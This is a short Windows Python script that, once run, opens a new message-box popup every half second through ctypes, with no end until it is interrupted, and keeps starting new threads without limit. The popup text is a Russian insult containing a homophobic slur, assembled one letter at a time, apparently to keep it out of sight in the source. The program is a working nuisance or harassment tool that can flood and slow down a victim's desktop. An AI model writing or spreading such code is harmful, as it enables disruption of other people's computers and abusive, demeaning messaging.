import subprocess
import time
import os
import threading
import sys
import ctypes

s = 'с'
i = 'и'
p = 'п'
e = 'е'
s2 = 'с'
t = 'т'
a = 'а'
t2 = 'т'
e2 = 'п'
b = 'и'
o = 'д'
r = 'р'

word = s + i + p + e + s2 + t + a + t2 + " " + e2 + b + o + r
running = True

def show_message_box():
    try:
        ctypes.windll.user32.MessageBoxW(0, word, "Сообщение", 0x40 | 0x1)
    except:
        pass

def run_message_loop():
    while running:
        try:
            threading.Thread(target=show_message_box).start()
            time.sleep(0.5)
        except:
            pass

threading.Thread(target=run_message_loop).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    running = False
